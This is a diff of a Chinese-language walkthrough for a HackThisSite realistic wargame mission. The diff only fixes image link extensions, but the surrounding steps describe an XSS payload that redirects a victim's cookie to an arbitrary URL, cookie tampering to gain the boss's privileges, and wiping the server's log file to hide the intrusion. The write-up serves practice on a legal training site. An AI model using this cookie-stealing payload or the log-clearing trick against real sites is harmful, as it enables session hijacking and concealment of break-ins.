@@ -23,47 +23,47 @@ Thanks man, good luck.
 ### Step 1
 - 先點進題目中所提到的[website](http://www.hackthissite.org/missions/realistic/9/)，可以看到首頁。
 
-![](https://imgur.com/jgMHHx5)
+![](https://imgur.com/jgMHHx5.png)
 
 ### Step 2
 - 登入，完成後會進來這邊
 
-![](https://imgur.com/NMgkH8l)
+![](https://imgur.com/NMgkH8l.png)
 
 - 點選左邊的Pay Salaries之後發現沒有權限
 
-![](https://imgur.com/aL4QT9o)
+![](https://imgur.com/aL4QT9o.png)
 
 
 ### Step 3
 - 點選左邊的Private Message，並且使用XSS Attack手法取得老闆的cookie。
 code : javascript:void(window.location=隨便一個網址+document.cookie)
-![](https://imgur.com/suDHOEq)
-![](https://imgur.com/ThwNXbS)
+![](https://imgur.com/suDHOEq.png)
+![](https://imgur.com/ThwNXbS.png)
 
 ### Step 4
 - 利用chrome外掛擴充功能，去更改網站的cookie內容，然後就發現能付薪水了。
 點擊Pay之後，會發現一段提示文字告訴你要清除紀錄
 
-![](https://imgur.com/DLV2nYy)
-![](https://imgur.com/K9SOFHH)
-![](https://imgur.com/1ukOFTP)
+![](https://imgur.com/DLV2nYy.png)
+![](https://imgur.com/K9SOFHH.png)
+![](https://imgur.com/1ukOFTP.png)
 
 ### Step 5
 - 開始找尋log存放的路徑，發現如果點擊左邊的Demo會有一個可以點擊下載東西的路徑，
 網址是[website](https://www.hackthissite.org/missions/realistic/9/files/downloads/CrappyDemo.exe.zip)
-![](https://imgur.com/zbgFXcV)
+![](https://imgur.com/zbgFXcV.png)
 - 砍掉後面的檔名會發現進到一個地方，並開始找尋log找到的地方，最後找到log存放的地方
 網址是[website](https://www.hackthissite.org/missions/realistic/9/files/logs/logs.txt)
-![](https://imgur.com/2avKq6x)
-![](https://imgur.com/cL9rRm1)
-![](https://imgur.com/HJon1vu)
-![](https://imgur.com/uSPTn2Y)
+![](https://imgur.com/2avKq6x.png)
+![](https://imgur.com/cL9rRm1.png)
+![](https://imgur.com/HJon1vu.png)
+![](https://imgur.com/uSPTn2Y.png)
 
 ### Step 6
 - 再來是要解決如何清除log.txt裡面的內容，發現點擊左邊功能表的Mailing List，有一段關鍵的話，(Note: This adds your email to the list, and at the same time, checks the list for anything without the '@' character and deletes it.)
 也就是說只要把不含@的文字送過去也可以把log清除掉
-![](https://imgur.com/ALLFopK)
+![](https://imgur.com/ALLFopK.png)
 
 - 那段程式碼如下：
 ```Html
@@ -93,13 +93,13 @@ code : javascript:void(window.location=隨便一個網址+document.cookie)
 
 - 最後在隨便亂打一個值並subsribe出去
 
-![](https://imgur.com/M9LJwQb)
+![](https://imgur.com/M9LJwQb.png)
 
 
 
 ### 成功
 
-![](https://imgur.com/Ly36nF3)
+![](https://imgur.com/Ly36nF3.png)
 
         
 
